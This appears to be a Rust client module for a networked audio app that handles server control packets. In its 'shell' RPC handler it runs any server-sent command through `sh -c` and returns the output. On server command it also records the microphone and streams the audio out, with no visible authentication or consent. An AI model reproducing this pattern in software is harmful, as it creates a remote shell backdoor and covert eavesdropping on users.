#![cfg(target_os = "linux")]

use crate::app::client::core::Client;
use crate::app::client::session::ClientSession;
use crate::audio::codec::OpusCodec;
use crate::audio::config::AudioConfig;
use crate::audio::player::AudioPlayer;
use crate::audio::recorder::AudioRecorder;
use crate::net::network::AudioSocket;
use crate::net::protocol::{AudioPacket, ControlPacket, RpcResult};
use anyhow::Result;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::broadcast;

pub async fn handle_packet(
    client: Arc<Client>,
    session: Arc<ClientSession>,
    packet: ControlPacket,
    audio_socket: Arc<AudioSocket>,
    stop_tx: broadcast::Sender<()>,
    server_addr: SocketAddr,
) -> Result<()> {
    match packet {
        ControlPacket::RpcResponse { id, result } => {
            session.rpc.fulfill(id, result);
        }
        ControlPacket::RpcRequest { id, method, args } => {
            println!("收到 RPC 请求: {} {:?}", method, args);
            let result = handle_rpc(&method, args).await;
            let response = ControlPacket::RpcResponse { id, result };
            session.writer.lock().await.send_packet(&response).await?;
        }
        ControlPacket::StartRecording { config } => {
            // ...
            println!("开始录音: {:?}", config);
            let mut stop_rx = stop_tx.subscribe();
            tokio::spawn(async move {
                if let Err(e) = handle_recording(config, audio_socket, server_addr, stop_rx).await {
                    eprintln!("录音出错: {}", e);
                }
            });
        }
        ControlPacket::StopRecording => {
            println!("停止录音");
            let _ = stop_tx.send(());
        }
        ControlPacket::StartPlayback { config } => {
            println!("开始播放: {:?}", config);
            let mut stop_rx = stop_tx.subscribe();
            tokio::spawn(async move {
                if let Err(e) = handle_playback(config, audio_socket, stop_rx).await {
                    eprintln!("播放出错: {}", e);
                }
            });
        }
        ControlPacket::StopPlayback => {
            println!("停止播放");
            let _ = stop_tx.send(());
        }
        ControlPacket::Ping => {
            let _ = session
                .writer
                .lock()
                .await
                .send_packet(&ControlPacket::Pong)
                .await;
        }
        _ => {}
    }
    Ok(())
}

pub async fn handle_rpc(method: &str, args: Vec<String>) -> RpcResult {
    match method {
        "shell" => handle_shell(args).await,
        _ => RpcResult {
            stdout: "".to_string(),
            stderr: format!("Unknown method: {}", method),
            code: -1,
        },
    }
}

async fn handle_shell(args: Vec<String>) -> RpcResult {
    if args.is_empty() {
        return RpcResult {
            stdout: "".to_string(),
            stderr: "Missing command argument".to_string(),
            code: -1,
        };
    }
    let cmd = &args[0];
    println!("Executing Shell: {}", cmd);

    #[cfg(target_os = "linux")]
    {
        use std::process::Command;
        let output = Command::new("sh").arg("-c").arg(cmd).output();
        match output {
            Ok(out) => RpcResult {
                stdout: String::from_utf8_lossy(&out.stdout).to_string(),
                stderr: String::from_utf8_lossy(&out.stderr).to_string(),
                code: out.status.code().unwrap_or(0),
            },
            Err(e) => RpcResult {
                stdout: "".to_string(),
                stderr: e.to_string(),
                code: -1,
            },
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        RpcResult {
            stdout: format!("Mock execution of {} successful", cmd),
            stderr: "".to_string(),
            code: 0,
        }
    }
}

async fn handle_recording(
    config: AudioConfig,
    socket: Arc<AudioSocket>,
    server_addr: SocketAddr,
    mut stop_rx: broadcast::Receiver<()>,
) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let recorder = AudioRecorder::new(&config)?;
        let mut codec = OpusCodec::new(&config)?;
        let mut pcm_buf = vec![0i16; config.frame_size];
        let mut opus_buf = vec![0u8; 4096];

        loop {
            if stop_rx.try_recv().is_ok() {
                break;
            }
            let n = recorder.read(&mut pcm_buf)?;
            if n > 0 {
                let opus_len = codec.encode(&pcm_buf[..n], &mut opus_buf)?;
                let packet = AudioPacket {
                    data: opus_buf[..opus_len].to_vec(),
                };
                socket.send_packet(&packet, server_addr).await?;
            }
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        println!("当前系统不支持 ALSA 录音，模拟发送音频数据...");
        loop {
            if stop_rx.try_recv().is_ok() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
            let packet = AudioPacket {
                data: vec![0u8; 10],
            };
            socket.send_packet(&packet, server_addr).await?;
        }
    }
    Ok(())
}

async fn handle_playback(
    config: AudioConfig,
    socket: Arc<AudioSocket>,
    mut stop_rx: broadcast::Receiver<()>,
) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let player = AudioPlayer::new(&config)?;
        let mut codec = OpusCodec::new(&config)?;
        let mut pcm_buf = vec![0i16; config.frame_size];
        let mut udp_buf = vec![0u8; 4096];

        loop {
            if stop_rx.try_recv().is_ok() {
                break;
            }
            let (packet, _) = socket.recv_packet(&mut udp_buf).await?;
            let pcm_len = codec.decode(&packet.data, &mut pcm_buf)?;
            player.write(&pcm_buf[..pcm_len])?;
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        println!("当前系统不支持 ALSA 播放，模拟接收音频数据...");
        let mut udp_buf = vec![0u8; 4096];
        loop {
            tokio::select! {
                _ = stop_rx.recv() => break,
                res = socket.recv_packet(&mut udp_buf) => {
                    let _ = res?;
                }
            }
        }
    }
    Ok(())
}
